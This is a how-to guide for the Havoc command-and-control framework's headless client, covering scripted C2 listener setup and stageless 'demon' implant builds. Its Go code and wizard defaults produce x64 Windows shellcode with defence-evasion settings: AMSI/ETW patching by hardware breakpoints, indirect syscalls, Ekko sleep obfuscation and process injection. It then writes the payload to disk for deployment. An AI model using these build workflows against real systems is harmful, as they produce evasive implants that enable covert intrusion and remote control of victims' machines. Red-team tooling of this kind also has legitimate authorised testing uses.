# Creating listeners and demons with the headless client

This guide shows how to automate listener provisioning and demon builds over the bundled headless Havoc client. It uses the same WebSocket protocol that the Qt GUI speaks, so you can re-use the Go implementation inside `teamserver/cmd/headless` to script the workflow end-to-end.

## Prerequisites

1. **Build the headless CLI.** Compile the Go module from `teamserver/` so that the `havoc` binary exposes the `headless` subcommand. 【F:teamserver/cmd/headless/headless.go†L70-L139】
2. **Start the teamserver and connect.** Launch the teamserver, then run the headless client with the operator credentials you configured:

   ```bash
   cd teamserver
   go build -o havoc
   ./havoc headless --host 127.0.0.1 --port 40056 --user operator --password "super-secret"
   ```

   The flags mirror the Qt login screen: host, port, username, password, and optional TLS verification and prompt controls. 【F:teamserver/cmd/headless/headless.go†L70-L139】

When the connection succeeds the client caches listeners, agents, and chat updates so your automation can react to state changes. 【F:teamserver/cmd/headless/headless.go†L124-L160】【F:teamserver/cmd/headless/headless.go†L252-L320】

## Guided listener creation from the CLI

Once authenticated you can type `listener-create` in the headless prompt to launch an interactive wizard that seeds every field
with a hardened HTTPS listener configuration. 【F:teamserver/cmd/headless/headless.go†L575-L655】 Press Enter to keep the defau
lt or provide a new value before the package is sent to the teamserver. The defaults match the requested profile:

- **Name:** `AS13_Listener`
- **Protocol:** `Https` (automatically marks the listener as secure)
- **Bind host / port:** `192.168.2.50:443`
- **Connect port:** `443`
- **Hosts:** `192.168.198.128`
- **Host rotation:** `Round-Robin`
- **User-Agent:** `Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.3
6`
- **Proxy:** disabled by default, with additional prompts only when you flip it on

When you accept the prompts the client emits a `Listener.Add` request that mirrors the GUI payload and logs the submission. 【F:t
eamserver/cmd/headless/headless.go†L657-L691】 The listener immediately appears in `listeners` output once the teamserver ackno
wledges it. 【F:teamserver/cmd/headless/headless.go†L252-L320】

## Guided demon builds from the CLI

Use the `demon-create` command to step through the stageless build flow without touching the Qt dialogs. 【F:teamserver/cmd/head
less/headless.go†L693-L770】 The wizard pre-populates the demon request with the provided agent settings, letting you tweak any 
field before the package is dispatched:

- **Listener:** `AS13_Listener`
- **Agent / Format / Arch:** Demon, `Windows Shellcode`, `x64`
- **Sleep / Jitter:** 5 seconds with 35% jitter
- **Sleep technique:** `Ekko`, **sleep jump gadget:** `None`
- **Stack duplication:** enabled
- **Proxy loading:** `RtlCreateTimer`
- **Indirect syscall:** enabled
- **Amsi/Etw patch:** `Hardware breakpoints`
- **Injection defaults:** `Native/Syscall` allocation and execution with Notepad spawn stubs for x64/x86

After confirmation the client marshals the JSON config, submits `Gate.Stageless`, and announces the build request on the log str
eam. 【F:teamserver/cmd/headless/headless.go†L745-L770】 Monitor the console (or run with `--no-prompt`) to capture the base64 pa
yload that follows. 【F:teamserver/cmd/headless/headless.go†L70-L108】【F:teamserver/cmd/headless/headless.go†L252-L320】

## Creating listeners programmatically

The GUI collects listener parameters (name, protocol, bind address, host rotation, headers, URIs, and proxy settings) and serialises them into the `Listener.Add` payload. 【F:client/src/UserInterface/Dialogs/Listener.cc†L618-L698】 The teamserver stores the config and immediately broadcasts a summary package back to every session. 【F:teamserver/cmd/server/listener.go†L220-L333】

Automation can reuse the headless client's `submitListenerAdd` helper directly—either by feeding the wizard defaults from `defaultListenerConfig()` or by composing a map manually: 【F:teamserver/cmd/headless/headless.go†L575-L691】

```go
cfg := defaultListenerConfig()
cfg.Name = "training-listener"
cfg.Hosts = "c2.company.tld"

info := map[string]any{
    "Name":          cfg.Name,
    "Protocol":      cfg.Protocol,
    "Status":        "online",
    "Secure":        "true",
    "Hosts":         cfg.Hosts,
    "HostBind":      cfg.HostBind,
    "HostRotation":  cfg.HostRotation,
    "PortBind":      cfg.PortBind,
    "PortConn":      cfg.PortConn,
    "Headers":       cfg.Headers,
    "Uris":          cfg.Uris,
    "UserAgent":     cfg.UserAgent,
    "HostHeader":    cfg.HostHeader,
    "Proxy Enabled": strconv.FormatBool(cfg.ProxyEnabled),
}

if err := client.submitListenerAdd(info); err != nil {
    log.Fatal(err)
}
```

When the teamserver acknowledges the listener, the reader loop updates `c.state.listeners`, so calling the `listeners` command or `snapshotListeners()` will show the new handler. 【F:teamserver/cmd/headless/headless.go†L252-L320】【F:teamserver/cmd/headless/headless.go†L666-L673】

> **Tip:** If you have a JSON template for the listener configuration, load it into the `info` map before sending. The server normalises booleans and host lists the same way it does for the GUI, so you only need to supply the keys you care about. 【F:teamserver/cmd/server/listener.go†L228-L333】

## Building demons (stageless payloads)

The payload dialog in the GUI submits a `Gate.Stageless` request that contains the agent type, listener name, architecture, output format, and JSON-encoded demon configuration. 【F:client/src/UserInterface/Dialogs/Payload.cc†L222-L248】 The dispatcher unmarshals this request, stitches the payload together, and replies with a base64-encoded artifact when the build succeeds. 【F:teamserver/cmd/server/dispatch.go†L821-L925】【F:teamserver/pkg/events/gate.go†L12-L27】

Headless automations can replicate `demon-create` by cloning the defaults from `defaultDemonBuildConfig()` and then invoking `sendPackage` with the assembled JSON payload. 【F:teamserver/cmd/headless/headless.go†L605-L770】 For example:

```go
cfg := defaultDemonBuildConfig()
cfg.Listener = "AS13_Listener"
cfg.Format = "Windows Shellcode"

config := map[string]any{
    "Sleep":             cfg.Sleep,
    "Jitter":            cfg.Jitter,
    "Indirect Syscall":  cfg.IndirectSyscall,
    "Stack Duplication": cfg.StackDuplication,
    "Sleep Technique":   cfg.SleepTechnique,
    "Sleep Jmp Gadget":  cfg.SleepJmpGadget,
    "Proxy Loading":     cfg.ProxyLoading,
    "Amsi/Etw Patch":    cfg.AmsiEtwPatch,
    "Injection": map[string]any{
        "Alloc":   cfg.InjectionAlloc,
        "Execute": cfg.InjectionExecute,
        "Spawn64": cfg.InjectionSpawn64,
        "Spawn32": cfg.InjectionSpawn32,
    },
}

configJSON, _ := json.Marshal(config)
pk := packager.Package{
    Head: packager.Head{
        Event:   packager.Type.Gate.Type,
        User:    client.username,
        Time:    time.Now().Format("02/01/2006 15:04:05"),
        OneTime: "true",
    },
    Body: packager.Body{
        SubEvent: packager.Type.Gate.Stageless,
        Info: map[string]any{
            "AgentType": "Demon",
            "Listener":  cfg.Listener,
            "Arch":      cfg.Arch,
            "Format":    cfg.Format,
            "Config":    string(configJSON),
        },
    },
}

if err := client.sendPackage(pk); err != nil {
    log.Fatal(err)
}
```

The dispatcher emits console events that stream build progress, followed by a `Gate.Stageless` response whose `PayloadArray` field contains the base64 payload bytes. The headless client now prints those console messages and automatically writes the decoded payload to disk using the server-provided filename (it appends a numeric suffix when the file already exists).【F:teamserver/cmd/headless/headless.go†L429-L476】 Check the prompt output for the exact save path—for example `demon.x64.bin` for stageless shellcode—and deploy it however you normally would.

Because the headless client captures the gate stream, you can keep it in interactive mode to watch the build output, or run with `--no-prompt` and process the responses programmatically inside your automation.【F:teamserver/cmd/headless/headless.go†L70-L108】【F:teamserver/cmd/headless/headless.go†L429-L476】

## Putting it together

A minimal automation loop looks like this:

1. Dial the teamserver with `newHeadlessClient`, supplying credentials and TLS options. 【F:teamserver/cmd/headless/headless.go†L88-L139】【F:teamserver/cmd/headless/headless.go†L168-L220】
2. Run `listener-create` (or call `submitListenerAdd` from your automation) after authentication to provision the C2 endpoint.
3. Wait for the listener summary to show `Status == Online` via `snapshotListeners()`.
4. Trigger `demon-create` (or post a `Gate.Stageless` package) with the listener name, architecture, and format you need.
5. Save the decoded payload returned in the next `Gate.Stageless` package.

With these building blocks you can script full operator workflows—spinning up listeners, generating new demons, and queuing tasks—without ever opening the Qt GUI.
